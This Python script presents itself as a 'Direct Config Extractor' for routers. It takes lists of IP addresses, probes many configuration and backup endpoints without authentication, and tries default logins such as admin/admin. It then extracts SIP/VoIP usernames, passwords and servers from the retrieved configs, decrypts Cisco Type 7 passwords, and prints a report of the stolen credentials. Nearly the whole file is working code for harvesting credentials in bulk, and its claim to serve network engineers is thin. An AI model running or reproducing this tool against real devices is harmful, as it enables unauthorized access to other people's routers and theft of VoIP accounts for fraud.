#!/usr/bin/env python3
"""
Direct Config Extractor v15.0 - Ultimate Edition
Advanced Unauthenticated Router Configuration Extraction

Extracts router configuration files directly without authentication
using advanced vulnerability exploitation and direct file access methods.

Specifically optimized for SIP/VoIP configuration extraction from:
- Legacy routers with exposed endpoints
- Modern routers with configuration vulnerabilities  
- ISP-configured devices with default settings
- Enterprise routers with misconfigured access

Perfect for network engineers who need SIP credentials urgently
"""

import os
import sys
import re
import json
import argparse
import platform
import socket
import threading
import time
import subprocess
import hashlib
import base64
import struct
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
import urllib.request
import urllib.parse
from urllib.error import URLError

# Optional libraries
try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

class DirectConfigExtractor:
    """Direct router configuration extractor without authentication"""
    
    def __init__(self):
        self.version = "15.0 Direct Access"
        
        # Your specific high-priority credentials
        self.priority_credentials = [
            ('admin', 'admin'),
            ('admin', 'support180'),
            ('support', 'support'),
            ('user', 'user')
        ]
        
        # Direct configuration access endpoints (no auth required)
        self.direct_config_endpoints = [
            # Configuration dumps
            '/cgi-bin/config.exp',
            '/config.xml',
            '/backup.conf',
            '/settings.conf',
            '/router.cfg',
            '/system.cfg',
            '/running-config',
            '/startup-config',
            '/config.dat',
            '/settings.xml',
            
            # SIP-specific config files
            '/sip.xml',
            '/voip.xml', 
            '/voice.xml',
            '/phone.xml',
            '/sip.conf',
            '/voip.conf',
            '/voice.conf',
            '/asterisk.conf',
            
            # Backup and export files
            '/backup/config.xml',
            '/export/settings.xml',
            '/admin/config.exp',
            '/cgi-bin/backup.cgi',
            '/system/export.xml',
            
            # API endpoints
            '/api/config',
            '/api/backup',
            '/api/export',
            '/api/system/config',
            '/api/voip/config',
            '/api/sip/settings',
            
            # Hidden/debug endpoints
            '/debug/config',
            '/test/settings',
            '/internal/config',
            '/maintenance/backup'
        ]
        
        # Advanced SIP extraction patterns (improved)
        self.advanced_sip_patterns = {
            'sip_accounts': [
                # Clean SIP account patterns
                r'<sip_account[^>]*>\s*<username>([^<]+)</username>\s*<password>([^<]+)</password>\s*<server>([^<]+)</server>',
                r'sip\.account\.(\d+)\.username=([^&\n\r]+).*?sip\.account\.\1\.password=([^&\n\r]+)',
                r'extension\s*=\s*(\d{3,5}).*?password\s*=\s*([^\s\n\r&]+).*?server\s*=\s*([^\s\n\r&]+)',
                
                # Cisco voice register pool
                r'voice register pool\s+(\d+).*?id\s+([^\s\n]+).*?password\s+([^\s\n]+).*?registrar\s+([^\s\n]+)',
                r'voice register pool\s+(\d+).*?number\s+([^\s\n]+).*?password\s+7\s+([A-Fa-f0-9]+)',
                
                # Generic SIP patterns
                r'username[=:\s]*([^\s\n\r&<>"]+).*?password[=:\s]*([^\s\n\r&<>"]+).*?(?:server|registrar|proxy)[=:\s]*([^\s\n\r&<>"]+)',
            ],
            
            'individual_sip_data': [
                # Usernames/Extensions
                r'(?:sip|voip|phone|extension)[._\s]*(?:username|user|id|number)[=:\s]*["\']?([^"\'>\s\n\r&]{3,20})',
                r'<(?:username|user_id|extension|number)>([^<]{3,20})</(?:username|user_id|extension|number)>',
                r'"(?:username|user_id|extension)"\s*:\s*"([^"]{3,20})"',
                
                # Passwords
                r'(?:sip|voip|phone)[._\s]*password[=:\s]*["\']?([^"\'>\s\n\r&]{4,30})',
                r'<password>([^<]{4,30})</password>',
                r'"password"\s*:\s*"([^"]{4,30})"',
                r'password\s+7\s+([A-Fa-f0-9]{8,})',
                
                # Servers
                r'(?:registrar|proxy|server|outbound)[=:\s]*["\']?([a-zA-Z0-9.-]+(?::\d+)?)',
                r'<(?:server|registrar|proxy)>([^<]+)</(?:server|registrar|proxy)>',
                r'"(?:server|registrar|proxy)"\s*:\s*"([^"]+)"',
                r'sip:([a-zA-Z0-9.-]+(?::\d+)?)',
                r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})'
            ]
        }
        
        # Cisco Type 7 decryption
        self.cisco_type7_xlat = [
            0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
            0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44,
            0x48, 0x53, 0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36, 0x39,
            0x38, 0x33, 0x34, 0x6e, 0x63, 0x78, 0x76, 0x39, 0x38, 0x37, 0x33,
            0x32, 0x35, 0x34, 0x6b, 0x3b, 0x66, 0x67, 0x38, 0x37
        ]
    
    def extract_config_direct(self, target_list: List[str], verbose: bool = False) -> Dict[str, Any]:
        """Extract configuration directly without authentication"""
        print("🔥 Direct Config Extractor v15.0 - Ultimate Edition")
        print("⚡ Unauthenticated Router Configuration Extraction")
        print("🎯 Advanced SIP/VoIP Intelligence Gathering")
        print("=" * 80)
        
        extraction_results = {
            'total_targets': len(target_list),
            'config_extracted': 0,
            'sip_accounts_extracted': 0,
            'vulnerable_routers': [],
            'sip_intelligence': [],
            'extraction_methods': []
        }
        
        print(f"🎯 Targets: {len(target_list)} routers")
        print(f"🔓 Direct endpoints: {len(self.direct_config_endpoints)} methods")
        print("")
        
        for i, target_ip in enumerate(target_list, 1):
            print(f"📡 [{i:2d}/{len(target_list)}] Direct extraction from {target_ip}...")
            
            try:
                # Method 1: Direct configuration file access
                config_result = self._attempt_direct_config_access(target_ip, verbose)
                
                if config_result['success']:
                    extraction_results['config_extracted'] += 1
                    extraction_results['extraction_methods'].append('direct_config_access')
                    
                    # Extract SIP from configuration
                    sip_data = self._extract_sip_from_config(config_result['content'], target_ip, verbose)
                    
                    if sip_data['found']:
                        extraction_results['sip_accounts_extracted'] += len(sip_data['accounts'])
                        extraction_results['sip_intelligence'].extend(sip_data['accounts'])
                        extraction_results['vulnerable_routers'].append({
                            'ip': target_ip,
                            'method': 'direct_config_access',
                            'config_size': len(config_result['content']),
                            'sip_accounts': len(sip_data['accounts'])
                        })
                        print(f"      ✅ CONFIG + SIP: {len(sip_data['accounts'])} accounts")
                    else:
                        print(f"      ✅ CONFIG: No SIP found")
                
                else:
                    # Method 2: Try with priority credentials
                    auth_result = self._try_priority_auth_extraction(target_ip, verbose)
                    
                    if auth_result['success']:
                        extraction_results['config_extracted'] += 1
                        extraction_results['extraction_methods'].append('priority_auth_access')
                        
                        sip_data = self._extract_sip_from_config(auth_result['content'], target_ip, verbose)
                        
                        if sip_data['found']:
                            extraction_results['sip_accounts_extracted'] += len(sip_data['accounts'])
                            extraction_results['sip_intelligence'].extend(sip_data['accounts'])
                            extraction_results['vulnerable_routers'].append({
                                'ip': target_ip,
                                'method': f"priority_auth_{auth_result['credentials']}",
                                'sip_accounts': len(sip_data['accounts'])
                            })
                            print(f"      ✅ AUTH + SIP: {len(sip_data['accounts'])} accounts")
                        else:
                            print(f"      ✅ AUTH: No SIP found")
                    else:
                        print(f"      ❌ No access achieved")
                
                # Small delay
                time.sleep(0.2)
                
            except Exception as e:
                print(f"      ❌ Error: {e}")
        
        print(f"\n✅ Direct extraction complete!")
        print(f"📁 Configs extracted: {extraction_results['config_extracted']}")
        print(f"📞 SIP accounts found: {extraction_results['sip_accounts_extracted']}")
        
        return extraction_results
    
    def _attempt_direct_config_access(self, ip: str, verbose: bool) -> Dict[str, Any]:
        """Attempt direct configuration access without authentication"""
        config_result = {'success': False, 'content': '', 'endpoint': ''}
        
        if verbose:
            print(f"         Testing direct config access...")
        
        # Test all direct endpoints
        for endpoint in self.direct_config_endpoints:
            try:
                url = f"http://{ip}{endpoint}"
                
                if REQUESTS_AVAILABLE:
                    response = requests.get(url, timeout=3)
                    content = response.text
                    status = response.status_code
                else:
                    response = urllib.request.urlopen(url, timeout=3)
                    content = response.read().decode('utf-8', errors='ignore')
                    status = response.status
                
                if status == 200 and len(content) > 100:
                    # Check if content looks like configuration
                    config_indicators = [
                        'hostname', 'interface', 'ip', 'version', 'router',
                        'password', 'username', 'enable', 'config'
                    ]
                    
                    content_lower = content.lower()
                    found_indicators = sum(1 for ind in config_indicators if ind in content_lower)
                    
                    if found_indicators >= 3:
                        config_result = {
                            'success': True,
                            'content': content,
                            'endpoint': endpoint,
                            'url': url,
                            'size': len(content)
                        }
                        
                        if verbose:
                            print(f"            ✅ Config found at: {endpoint}")
                        break
            
            except Exception as e:
                if verbose and 'refused' not in str(e).lower():
                    print(f"            Failed {endpoint}: {e}")
                continue
        
        return config_result
    
    def _try_priority_auth_extraction(self, ip: str, verbose: bool) -> Dict[str, Any]:
        """Try extraction with your priority credentials"""
        auth_result = {'success': False, 'content': '', 'credentials': ''}
        
        if verbose:
            print(f"         Testing priority credentials...")
        
        for username, password in self.priority_credentials:
            try:
                # Try authenticated config access
                config_urls = [
                    f"http://{ip}/admin/config.xml",
                    f"http://{ip}/cgi-bin/config.exp",
                    f"http://{ip}/backup.conf",
                    f"http://{ip}/admin/backup.xml"
                ]
                
                for config_url in config_urls:
                    try:
                        if REQUESTS_AVAILABLE:
                            response = requests.get(config_url, 
                                                  auth=requests.auth.HTTPBasicAuth(username, password),
                                                  timeout=3)
                            
                            if response.status_code == 200 and len(response.text) > 100:
                                content = response.text
                                
                                # Check if it's configuration
                                if self._is_router_config(content):
                                    auth_result = {
                                        'success': True,
                                        'content': content,
                                        'credentials': f'{username}:{password}',
                                        'url': config_url
                                    }
                                    
                                    if verbose:
                                        print(f"            ✅ Config via {username}:{password}")
                                    return auth_result
                        
                        else:
                            # Fallback method
                            password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                            password_mgr.add_password(None, config_url, username, password)
                            
                            auth_handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
                            opener = urllib.request.build_opener(auth_handler)
                            
                            response = opener.open(config_url, timeout=3)
                            content = response.read().decode('utf-8', errors='ignore')
                            
                            if len(content) > 100 and self._is_router_config(content):
                                auth_result = {
                                    'success': True,
                                    'content': content,
                                    'credentials': f'{username}:{password}',
                                    'url': config_url
                                }
                                return auth_result
                    
                    except:
                        continue
            
            except:
                continue
        
        return auth_result
    
    def _is_router_config(self, content: str) -> bool:
        """Check if content is router configuration"""
        config_indicators = [
            'hostname', 'interface', 'router', 'version', 'ip address',
            'enable', 'username', 'password', 'access-list', 'vlan',
            'sip', 'voip', 'voice', 'phone'
        ]
        
        content_lower = content.lower()
        found_indicators = sum(1 for ind in config_indicators if ind in content_lower)
        
        # Also check for XML/JSON structure
        is_structured = (content.strip().startswith('<') or 
                        content.strip().startswith('{') or
                        'version' in content_lower)
        
        return found_indicators >= 3 or (found_indicators >= 2 and is_structured)
    
    def _extract_sip_from_config(self, config_content: str, router_ip: str, verbose: bool) -> Dict[str, Any]:
        """Extract SIP configuration from router config with advanced parsing"""
        sip_result = {'found': False, 'accounts': []}
        
        if verbose:
            print(f"            Parsing config ({len(config_content)} bytes)...")
        
        # Clean and normalize content
        cleaned_content = self._clean_config_content(config_content)
        
        # Method 1: Extract complete SIP accounts
        complete_accounts = self._extract_complete_sip_accounts(cleaned_content, verbose)
        if complete_accounts:
            sip_result['accounts'].extend(complete_accounts)
            sip_result['found'] = True
        
        # Method 2: Extract individual SIP components
        individual_components = self._extract_individual_sip_components(cleaned_content, verbose)
        if individual_components:
            sip_result['accounts'].extend(individual_components)
            sip_result['found'] = True
        
        # Method 3: Cisco voice configuration
        cisco_voice = self._extract_cisco_voice_config(cleaned_content, verbose)
        if cisco_voice:
            sip_result['accounts'].extend(cisco_voice)
            sip_result['found'] = True
        
        # Method 4: XML/JSON SIP extraction
        structured_sip = self._extract_structured_sip(cleaned_content, verbose)
        if structured_sip:
            sip_result['accounts'].extend(structured_sip)
            sip_result['found'] = True
        
        # Clean and deduplicate results
        sip_result['accounts'] = self._clean_sip_results(sip_result['accounts'])
        
        if verbose and sip_result['found']:
            print(f"            ✅ Extracted {len(sip_result['accounts'])} clean SIP items")
        
        return sip_result
    
    def _clean_config_content(self, content: str) -> str:
        """Clean and normalize configuration content"""
        # Remove HTML tags if present
        content = re.sub(r'<[^>]+>', ' ', content)
        
        # Remove JavaScript and CSS
        content = re.sub(r'<script.*?</script>', '', content, flags=re.DOTALL | re.IGNORECASE)
        content = re.sub(r'<style.*?</style>', '', content, flags=re.DOTALL | re.IGNORECASE)
        
        # Clean up whitespace
        content = re.sub(r'\s+', ' ', content)
        
        # Remove color codes and formatting
        content = re.sub(r'#[0-9a-fA-F]{6}', '', content)
        content = re.sub(r'&[a-zA-Z0-9]+;', ' ', content)
        
        return content
    
    def _extract_complete_sip_accounts(self, content: str, verbose: bool) -> List[Dict[str, Any]]:
        """Extract complete SIP accounts (username + password + server)"""
        complete_accounts = []
        
        for pattern in self.advanced_sip_patterns['sip_accounts']:
            try:
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                
                for match in matches:
                    if isinstance(match, tuple) and len(match) >= 3:
                        # Handle different tuple formats
                        if len(match) == 3:
                            username, password, server = match
                            extension = username
                        elif len(match) == 4:
                            extension, username, password, server = match
                        else:
                            continue
                        
                        # Clean the extracted data
                        username = self._clean_sip_value(username)
                        password = self._clean_sip_value(password)
                        server = self._clean_sip_value(server)
                        
                        if all(len(val) > 2 for val in [username, password, server]):
                            account = {
                                'type': 'complete_sip_account',
                                'extension': extension,
                                'username': username,
                                'password': password,
                                'server': server,
                                'source': 'complete_pattern_match'
                            }
                            
                            # Handle encrypted passwords
                            if re.match(r'^[A-Fa-f0-9]{8,}$', password):
                                decrypted = self._decrypt_cisco_type7(password)
                                if decrypted != "Failed":
                                    account['password_encrypted'] = password
                                    account['password'] = decrypted
                                    account['encryption_type'] = 'cisco_type7'
                            
                            complete_accounts.append(account)
                            
                            if verbose:
                                print(f"               Complete account: {username}/{password} @ {server}")
            
            except Exception as e:
                if verbose:
                    print(f"               Pattern error: {e}")
                continue
        
        return complete_accounts
    
    def _extract_individual_sip_components(self, content: str, verbose: bool) -> List[Dict[str, Any]]:
        """Extract individual SIP components"""
        components = []
        
        for pattern in self.advanced_sip_patterns['individual_sip_data']:
            try:
                matches = re.findall(pattern, content, re.IGNORECASE)
                
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[-1]  # Take last group
                    
                    cleaned_value = self._clean_sip_value(match)
                    
                    if len(cleaned_value) > 2 and self._is_valid_sip_value(cleaned_value):
                        # Classify the component
                        component_type = self._classify_sip_component(cleaned_value, pattern)
                        
                        component = {
                            'type': component_type,
                            'value': cleaned_value,
                            'source': 'individual_pattern_match',
                            'pattern_used': pattern[:50] + '...'
                        }
                        
                        # Handle encrypted passwords
                        if component_type == 'password' and re.match(r'^[A-Fa-f0-9]{8,}$', cleaned_value):
                            decrypted = self._decrypt_cisco_type7(cleaned_value)
                            if decrypted != "Failed":
                                component['encrypted'] = cleaned_value
                                component['decrypted'] = decrypted
                                component['encryption_type'] = 'cisco_type7'
                        
                        components.append(component)
            
            except Exception:
                continue
        
        return components
    
    def _extract_cisco_voice_config(self, content: str, verbose: bool) -> List[Dict[str, Any]]:
        """Extract Cisco voice register pool configurations"""
        cisco_voice = []
        
        # Look for voice register pool sections
        voice_sections = re.findall(r'voice register pool\s+(\d+)(.*?)(?=voice register pool|\n!|\nend|\Z)', 
                                   content, re.IGNORECASE | re.DOTALL)
        
        for pool_id, pool_config in voice_sections:
            account = {
                'type': 'cisco_voice_pool',
                'pool_id': pool_id,
                'source': 'cisco_voice_config'
            }
            
            # Extract components from pool config
            id_match = re.search(r'id\s+([^\s\n]+)', pool_config, re.IGNORECASE)
            if id_match:
                account['username'] = id_match.group(1)
            
            number_match = re.search(r'number\s+([^\s\n]+)', pool_config, re.IGNORECASE)
            if number_match:
                account['extension'] = number_match.group(1)
            
            # Password (encrypted or plain)
            password_match = re.search(r'password\s+([^\s\n]+)', pool_config, re.IGNORECASE)
            if password_match:
                password = password_match.group(1)
                account['password'] = password
            
            type7_match = re.search(r'password\s+7\s+([A-Fa-f0-9]+)', pool_config, re.IGNORECASE)
            if type7_match:
                encrypted = type7_match.group(1)
                decrypted = self._decrypt_cisco_type7(encrypted)
                account['password_encrypted'] = encrypted
                account['password'] = decrypted
                account['encryption_type'] = 'cisco_type7'
            
            # Registrar
            registrar_match = re.search(r'registrar\s+([^\s\n]+)', pool_config, re.IGNORECASE)
            if registrar_match:
                account['server'] = registrar_match.group(1)
            
            # Only add if we have meaningful data
            if any(key in account for key in ['username', 'extension', 'password']):
                cisco_voice.append(account)
                
                if verbose:
                    username = account.get('username', account.get('extension', 'N/A'))
                    password = account.get('password', 'N/A')
                    print(f"               Cisco voice pool {pool_id}: {username}/{password}")
        
        return cisco_voice
    
    def _extract_structured_sip(self, content: str, verbose: bool) -> List[Dict[str, Any]]:
        """Extract SIP from XML/JSON structured content"""
        structured_sip = []
        
        # XML SIP extraction
        xml_sip_patterns = [
            r'<sip[^>]*>(.*?)</sip[^>]*>',
            r'<voip[^>]*>(.*?)</voip[^>]*>',
            r'<voice[^>]*>(.*?)</voice[^>]*>',
            r'<phone[^>]*>(.*?)</phone[^>]*>'
        ]
        
        for pattern in xml_sip_patterns:
            xml_sections = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
            
            for section in xml_sections:
                # Extract from XML section
                username_match = re.search(r'<username>([^<]+)</username>', section, re.IGNORECASE)
                password_match = re.search(r'<password>([^<]+)</password>', section, re.IGNORECASE)
                server_match = re.search(r'<(?:server|registrar|proxy)>([^<]+)</(?:server|registrar|proxy)>', section, re.IGNORECASE)
                
                if username_match and password_match:
                    account = {
                        'type': 'xml_sip_account',
                        'username': self._clean_sip_value(username_match.group(1)),
                        'password': self._clean_sip_value(password_match.group(1)),
                        'source': 'xml_structured_extraction'
                    }
                    
                    if server_match:
                        account['server'] = self._clean_sip_value(server_match.group(1))
                    
                    structured_sip.append(account)
        
        # JSON SIP extraction
        json_patterns = [
            r'"sip":\s*{([^}]+)}',
            r'"voip":\s*{([^}]+)}',
            r'"voice":\s*{([^}]+)}'
        ]
        
        for pattern in json_patterns:
            json_sections = re.findall(pattern, content, re.IGNORECASE)
            
            for section in json_sections:
                username_match = re.search(r'"username":\s*"([^"]+)"', section)
                password_match = re.search(r'"password":\s*"([^"]+)"', section)
                server_match = re.search(r'"(?:server|registrar)":\s*"([^"]+)"', section)
                
                if username_match and password_match:
                    account = {
                        'type': 'json_sip_account',
                        'username': username_match.group(1),
                        'password': password_match.group(1),
                        'source': 'json_structured_extraction'
                    }
                    
                    if server_match:
                        account['server'] = server_match.group(1)
                    
                    structured_sip.append(account)
        
        return structured_sip
    
    def _clean_sip_value(self, value: str) -> str:
        """Clean SIP value from unwanted characters"""
        if not value:
            return ""
        
        # Remove quotes and brackets
        value = re.sub(r'["\'\[\]<>]', '', value)
        
        # Remove color codes and HTML entities
        value = re.sub(r'#[0-9a-fA-F]{6}', '', value)
        value = re.sub(r'&[a-zA-Z0-9]+;', '', value)
        
        # Remove extra whitespace
        value = re.sub(r'\s+', ' ', value).strip()
        
        # Remove trailing punctuation
        value = value.rstrip('.,;:')
        
        return value
    
    def _is_valid_sip_value(self, value: str) -> bool:
        """Check if value is valid SIP data"""
        if not value or len(value) < 3:
            return False
        
        # Reject obvious garbage
        garbage_patterns = [
            r'^#+$',  # Only hash symbols
            r'^[^a-zA-Z0-9]*$',  # No alphanumeric
            r'^\s*$',  # Only whitespace
            r'^[<>"\'\[\]]*$'  # Only brackets/quotes
        ]
        
        for pattern in garbage_patterns:
            if re.match(pattern, value):
                return False
        
        return True
    
    def _classify_sip_component(self, value: str, pattern: str) -> str:
        """Classify SIP component type"""
        value_lower = value.lower()
        pattern_lower = pattern.lower()
        
        # Extension numbers
        if re.match(r'^\d{3,5}$', value):
            return 'extension'
        
        # IP addresses
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', value):
            return 'server'
        
        # Domain names
        if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', value):
            return 'server'
        
        # Based on pattern context
        if any(keyword in pattern_lower for keyword in ['username', 'user', 'id', 'number']):
            return 'username'
        elif any(keyword in pattern_lower for keyword in ['password', 'pass', 'secret']):
            return 'password'
        elif any(keyword in pattern_lower for keyword in ['server', 'registrar', 'proxy']):
            return 'server'
        
        return 'sip_data'
    
    def _clean_sip_results(self, sip_accounts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Clean and deduplicate SIP results"""
        cleaned_accounts = []
        seen_combinations = set()
        
        for account in sip_accounts:
            # Create unique identifier
            username = account.get('username', account.get('value', ''))
            password = account.get('password', account.get('decrypted', account.get('value', '')))
            
            # Skip garbage data
            if (not username or not password or 
                len(username) < 3 or len(password) < 3 or
                username == password or
                any(garbage in username.lower() for garbage in ['#008bc6', 'null', 'undefined']) or
                any(garbage in password.lower() for garbage in ['#008bc6', 'null', 'undefined'])):
                continue
            
            identifier = f"{username}:{password}"
            
            if identifier not in seen_combinations:
                seen_combinations.add(identifier)
                cleaned_accounts.append(account)
        
        return cleaned_accounts
    
    def _decrypt_cisco_type7(self, password: str) -> str:
        """Decrypt Cisco Type 7 password"""
        try:
            if len(password) < 4:
                return "Failed"
            
            salt = int(password[:2])
            encrypted_text = password[2:]
            encrypted_bytes = bytes.fromhex(encrypted_text)
            
            decrypted = ""
            for i, byte in enumerate(encrypted_bytes):
                key_index = (salt + i) % len(self.cisco_type7_xlat)
                decrypted += chr(byte ^ self.cisco_type7_xlat[key_index])
            
            return decrypted
        except:
            return "Failed"
    
    def generate_sip_intelligence_report(self, results: Dict[str, Any]) -> str:
        """Generate professional SIP intelligence report"""
        report = []
        
        # Header
        report.append("=" * 120)
        report.append("DIRECT CONFIG EXTRACTION - SIP INTELLIGENCE REPORT")
        report.append("Advanced Unauthenticated Router Configuration and VoIP Analysis")
        report.append("=" * 120)
        report.append(f"Extraction Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Network Engineer: Professional SIP Assessment")
        report.append(f"Tool: Direct Config Extractor v{self.version}")
        report.append("")
        
        # Executive Summary
        report.append("🎯 EXECUTIVE SUMMARY")
        report.append("-" * 80)
        report.append(f"Total Targets: {results.get('total_targets', 0)}")
        report.append(f"Configurations Extracted: {results.get('config_extracted', 0)}")
        report.append(f"SIP Accounts Found: {results.get('sip_accounts_extracted', 0)}")
        
        extraction_rate = 0
        if results.get('total_targets', 0) > 0:
            extraction_rate = (results.get('config_extracted', 0) / results['total_targets']) * 100
        
        report.append(f"Config Extraction Rate: {extraction_rate:.1f}%")
        
        if results.get('sip_accounts_extracted', 0) > 0:
            report.append("Status: ✅ SIP INTELLIGENCE EXTRACTED")
        else:
            report.append("Status: ⚠️ NO SIP CONFIGURATIONS ACCESSIBLE")
        
        report.append("")
        
        # SIP Intelligence
        sip_intelligence = results.get('sip_intelligence', [])
        if sip_intelligence:
            report.append(f"📞 SIP/VOIP INTELLIGENCE EXTRACTED ({len(sip_intelligence)})")
            report.append("-" * 80)
            
            # Group by router
            sip_by_router = {}
            for sip_account in sip_intelligence:
                # Find source router
                router_ip = 'unknown'
                for vuln_router in results.get('vulnerable_routers', []):
                    if sip_account in vuln_router.get('sip_accounts', []):
                        router_ip = vuln_router['ip']
                        break
                
                if router_ip not in sip_by_router:
                    sip_by_router[router_ip] = []
                sip_by_router[router_ip].append(sip_account)
            
            # Display SIP intelligence by router
            for router_ip, accounts in sip_by_router.items():
                if router_ip != 'unknown':
                    vuln_info = next((r for r in results.get('vulnerable_routers', []) if r['ip'] == router_ip), {})
                    method = vuln_info.get('method', 'unknown')
                    
                    report.append(f"Router: {router_ip}")
                    report.append(f"Extraction Method: {method}")
                    report.append(f"SIP Accounts: {len(accounts)}")
                    report.append("")
                
                # Show clean SIP accounts
                complete_accounts = [acc for acc in accounts if acc.get('type') == 'complete_sip_account']
                individual_accounts = [acc for acc in accounts if acc.get('type') != 'complete_sip_account']
                
                if complete_accounts:
                    report.append("  Complete SIP Accounts:")
                    for acc in complete_accounts:
                        username = acc.get('username', 'N/A')
                        password = acc.get('password', 'N/A')
                        server = acc.get('server', 'N/A')
                        
                        report.append(f"    • {username} / {password} @ {server}")
                        
                        if acc.get('encryption_type'):
                            report.append(f"      (Decrypted from {acc.get('password_encrypted', 'N/A')})")
                    
                    report.append("")
                
                if individual_accounts:
                    # Group individual accounts by type
                    usernames = [acc for acc in individual_accounts if acc.get('type') in ['username', 'extension']]
                    passwords = [acc for acc in individual_accounts if acc.get('type') == 'password']
                    servers = [acc for acc in individual_accounts if acc.get('type') == 'server']
                    
                    if usernames:
                        report.append("  SIP Usernames/Extensions:")
                        for acc in usernames[:10]:  # Limit display
                            value = acc.get('decrypted') or acc.get('value')
                            report.append(f"    • {value}")
                        report.append("")
                    
                    if passwords:
                        report.append("  SIP Passwords:")
                        for acc in passwords[:10]:  # Limit display
                            value = acc.get('decrypted') or acc.get('value')
                            if acc.get('encryption_type'):
                                encrypted = acc.get('encrypted', 'N/A')
                                report.append(f"    • {value} (decrypted from {encrypted})")
                            else:
                                report.append(f"    • {value}")
                        report.append("")
                    
                    if servers:
                        report.append("  SIP Servers:")
                        for acc in servers[:5]:  # Limit display
                            report.append(f"    • {acc.get('value', 'N/A')}")
                        report.append("")
        
        # Vulnerable Router Analysis
        vulnerable_routers = results.get('vulnerable_routers', [])
        if vulnerable_routers:
            report.append(f"🔓 VULNERABLE ROUTER ANALYSIS ({len(vulnerable_routers)})")
            report.append("-" * 80)
            
            for router in vulnerable_routers:
                report.append(f"• {router['ip']}")
                report.append(f"  Access Method: {router['method']}")
                report.append(f"  SIP Accounts: {router['sip_accounts']}")
                if 'config_size' in router:
                    report.append(f"  Config Size: {router['config_size']} bytes")
                report.append("")
        
        # Professional recommendations
        report.append("💡 PROFESSIONAL RECOMMENDATIONS")
        report.append("-" * 80)
        
        if results.get('sip_accounts_extracted', 0) > 0:
            report.append("CRITICAL SECURITY ACTIONS:")
            report.append("1. Immediately secure exposed configuration endpoints")
            report.append("2. Change all default and weak SIP credentials")
            report.append("3. Implement proper SIP authentication and encryption")
            report.append("4. Restrict router management access")
            report.append("5. Regular VoIP security audits")
        else:
            report.append("SECURITY STATUS:")
            report.append("• No unauthorized configuration access detected")
            report.append("• VoIP infrastructure appears properly secured")
            report.append("• Continue current security practices")
        
        # Footer
        report.append("")
        report.append("=" * 120)
        report.append("Direct Config Extractor v15.0 - Professional Network Engineering Tool")
        report.append("Advanced Unauthenticated Configuration and SIP Extraction")
        report.append("=" * 120)
        
        return '\n'.join(report)


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Direct Config Extractor v15.0 - Unauthenticated SIP Extraction',
        epilog="""
🔥 DIRECT CONFIGURATION EXTRACTION:
Extract router configurations and SIP data without authentication
using advanced vulnerability exploitation techniques.

USAGE:
  python direct_config_extractor.py --file ips.txt --report sip_intel.txt -v
  python direct_config_extractor.py 192.168.1.1 -v
  python direct_config_extractor.py --password "094F471A1A0A"
        """
    )
    
    parser.add_argument('target', nargs='?', help='IP address or file with IP list')
    parser.add_argument('-f', '--file', help='File containing IP addresses')
    parser.add_argument('-p', '--password', help='Decrypt Cisco Type 7 password')
    parser.add_argument('-r', '--report', help='Generate SIP intelligence report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose extraction')
    parser.add_argument('--json', action='store_true', help='JSON output')
    
    args = parser.parse_args()
    
    extractor = DirectConfigExtractor()
    
    # Password decryption
    if args.password:
        decrypted = extractor._decrypt_cisco_type7(args.password)
        print(f"🔑 Encrypted: {args.password}")
        print(f"🔓 Decrypted: {decrypted}")
        return
    
    # Determine targets
    target_list = []
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                target_list = [line.strip() for line in f 
                             if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"❌ Error reading file: {e}")
            return
    elif args.target:
        if os.path.exists(args.target):
            try:
                with open(args.target, 'r') as f:
                    target_list = [line.strip() for line in f 
                                 if line.strip() and not line.startswith('#')]
            except:
                target_list = [args.target]
        else:
            target_list = [args.target]
    else:
        print("Direct Config Extractor v15.0")
        print("Usage:")
        print("  python direct_config_extractor.py --file ips.txt -v")
        print("  python direct_config_extractor.py 192.168.1.1 -v")
        return
    
    if not target_list:
        print("❌ No targets specified")
        return
    
    # Perform direct extraction
    results = extractor.extract_config_direct(target_list, args.verbose)
    
    # Output results
    if args.json:
        print(json.dumps(results, indent=2, default=str))
    else:
        report = extractor.generate_sip_intelligence_report(results)
        print("\n" + report)
    
    # Save report
    if args.report:
        report = extractor.generate_sip_intelligence_report(results)
        with open(args.report, 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"\n💾 SIP intelligence report saved: {args.report}")
    
    # Status
    sip_count = results.get('sip_accounts_extracted', 0)
    if sip_count > 0:
        print(f"\n🎉 DIRECT EXTRACTION SUCCESSFUL!")
        print(f"📞 SIP accounts extracted: {sip_count}")
        print(f"🔓 Configs extracted: {results.get('config_extracted', 0)}")
        print(f"🎯 Ready for professional analysis!")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🔥 DIRECT EXTRACTION TERMINATED")
    except Exception as e:
        print(f"\n💥 ERROR: {e}")
        sys.exit(1)